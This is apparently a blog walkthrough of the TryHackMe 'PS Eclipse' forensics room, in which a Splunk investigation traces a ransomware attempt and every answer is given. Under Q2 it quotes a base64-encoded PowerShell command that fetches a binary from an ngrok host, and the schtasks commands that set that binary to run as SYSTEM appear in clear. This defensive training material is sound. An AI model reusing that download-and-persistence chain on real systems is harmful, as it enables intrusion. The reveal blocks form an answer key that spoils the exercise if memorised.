---
author: Ricard Alcaraz Mancebo
title: PS Eclipse - TryHackMe
tags:
  - Cybersecurity
  - Blue Team
  - TryHackMe
  - Digital Forensics
languages:
  - splunk
  - cyberchef
  - virustotal
image:
  url: https://ricard-alcaraz.com/images/ps-eclipse-thm/main.png
  alt: logo tryhackme
description: My notes solving PS Eclipse - TryHackMe
pubDate: 2025-09-19T20:25:00.000+02:00
---
## Scenario:
You are a SOC Analyst for an MSSP (Managed Security Service Provider) company called TryNotHackMe .

A customer sent an email asking for an analyst to investigate the events that occurred on Keegan's machine on Monday, May 16th, 2022 . The client noted that the machine is operational, but some files have a weird file extension. The client is worried that there was a ransomware attempt on Keegan's device. 

Your manager has tasked you to check the events in Splunk to determine what occurred in Keegan's device. 

## Documents Provided
- Splunk Instance

## Q1: A suspicious binary was downloaded to the endpoint. What was the name of the binary?
First of all lets open the splunk instance on the broeser, once there we have to go to `Search & Reporting`. And also we know the date range that we have to analyse so we can do that on the serach bar.
We dont know the index so we can start by doing a query using `*` and then see what index we have to investigate, which seems to be the index `main`.
Once there we can also check the available sources:

![splunk image](/images/ps-eclipse-thm/q1.png)

We are looking for a downloaded binary, so we can search by the sources that can provide us this information. In this case we have `Sysmon` so it seems like a good starting point.
What I did was search using this query:

```cmd
index="main" source="WinEventLog:Microsoft-Windows-Sysmon/Operational" EventCode=3 Message="*.exe*" | sort +_time
```
Looking for the sysmon event 3 (Network connection), and also `.exe` since we are looking for a bynary, and I saw that the field `Message` could contain more info related to a bynary, I think is also possible to use the field `Image` It would be more accurate.
Doing that search, and taking a look at the `Image` statistics I found a suspicious filename with the most events related, this was the answer.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    OUTSTANDING_GUTTER.exe
  </div>
</details>


## Q2: What is the address the binary was downloaded from? Add http:// to your answer & defang the URL.

For this one, I started looking for some DNS queries to see what domains where requested.
```cmd
index="main" "dns" | sort +_time
```
And then I took a look at the `QueryName` results to see if there was something suspicious, the first two results seemed suspicious so I did a query to see to which events are related.
However that didn't provide me more information to conclude which one was, so I invested more time in this by searching for the first process related to each of the querys, the process that obtains as a result the suspicious domains, and finally I found a process `9412` after checking some events manually. Then I found this:
```cmd
	powershell.exe -exec bypass -enc UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgAC0ARABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgACQAdAByAHUAZQA7AHcAZwBlAHQAIABoAHQAdABwADoALwAvADgAOAA2AGUALQAxADgAMQAtADIAMQA1AC0AMgAxADQALQAzADIALgBuAGcAcgBvAGsALgBpAG8ALwBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACAALQBPAHUAdABGAGkAbABlACAAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlADsAUwBDAEgAVABBAFMASwBTACAALwBDAHIAZQBhAHQAZQAgAC8AVABOACAAIgBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACIAIAAvAFQAUgAgACIAQwA6AFwAVwBpAG4AZABvAHcAcwBcAFQAZQBtAHAAXABDAE8AVQBUAFMAVABBAE4ARABJAE4ARwBfAEcAVQBUAFQARQBSAC4AZQB4AGUAIgAgAC8AUwBDACAATwBOAEUAVgBFAE4AVAAgAC8ARQBDACAAQQBwAHAAbABpAGMAYQB0AGkAbwBuACAALwBNAE8AIAAqAFsAUwB5AHMAdABlAG0ALwBFAHYAZQBuAHQASQBEAD0ANwA3ADcAXQAgAC8AUgBVACAAIgBTAFkAUwBUAEUATQAiACAALwBmADsAUwBDAEgAVABBAFMASwBTACAALwBSAHUAbgAgAC8AVABOACAAIgBPAFUAVABTAFQAQQBOAEQASQBOAEcAXwBHAFUAVABUAEUAUgAuAGUAeABlACIA
```
Its a Base64 encoded string, after decoding it we will found the address that downloaded the suspicious file.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    hxxp[://]886e-181-215-214-32[.]ngrok[.]io
  </div>
</details>


## Q3: What Windows executable was used to download the suspicious binary? Enter full path.

We already know this answer from the previous question, I already leaved a hint there, we just have to know the full path, that its on the same event as before.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
  </div>
</details>

## Q4: What command was executed to configure the suspicious binary to run with elevated privileges?

We also already have the answer from decoding the Base64 string, so now we only are missing one thing that it that it wants also the path of the executable, finding that and pasting the options you will have the answer.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
    "C:\Windows\system32\schtasks.exe" /Create /TN OUTSTANDING_GUTTER.exe /TR C:\Windows\Temp\COUTSTANDING_GUTTER.exe /SC ONEVENT /EC Application /MO *[System/EventID=777] /RU SYSTEM /f
  </div>
</details>

## Q5: What permissions will the suspicious binary run as? What was the command to run the binary with elevated privileges? (Format: User + ; + CommandLine)

We have the information already, its the last part of the command we found, but we need to find the user, we can find the users related to the previous binary we found, we are looking for a user that can execute with elevated privileges.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
NT AUTHORITY\SYSTEM;"C:\Windows\system32\schtasks.exe" /Run /TN OUTSTANDING_GUTTER.exe
  </div>
</details>

## Q6: The suspicious binary connected to a remote server. What address did it connect to? Add http:// to your answer & defang the URL.

We found another suspicious domain previously, if we didn't analyze this one we can do the same, the process `8544` is the one related to this domain query, so we can assume that its connecting to the address. 

<details>
  <summary>Click to reveal the answer</summary>
  <div>
hxxp[://]9030-181-215-214-32[.]ngrok[.]io
  </div>
</details>

## Q7: A PowerShell script was downloaded to the same location as the suspicious binary. What was the name of the file?

The question already give us a clue, that is a PS scritp so the extension will be `.ps1`, so I searched for it:
```cmd
index="main" TargetFilename="C:\\Windows\\Temp\\*.ps1" 
|  sort +_time
```

and I found it in the third event.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
script.ps1
  </div>
</details>

## Q8: The malicious script was flagged as malicious. What do you think was the actual name of the malicious script?

Now that we know the name of the script we can just search for it in the search bar and then we can find a event that contains it SHA256, if we check it in `VirusTotal` we will find the answer.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
BlackSun.ps1
  </div>
</details>

## Q9: A ransomware note was saved to disk, which can serve as an IOC. What is the full path to which the ransom note was saved?

Now we are looking for a note, the most probable extension of the note is `.txt` so we can try and search for it. There is only 2 events, and we will find the answer there.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
C:\Users\keegan\Downloads\vasg6b0wmw029hd\BlackSun_README.txt
  </div>
</details>

## Q10: The script saved an image file to disk to replace the user's desktop wallpaper, which can also serve as an IOC. What is the full path of the image?

For this one I just searched for different image extensions since we have this clue, so i tried with some and I found one with a suspicious name.

<details>
  <summary>Click to reveal the answer</summary>
  <div>
C:\Users\Public\Pictures\blacksun.jpg
  </div>
</details>


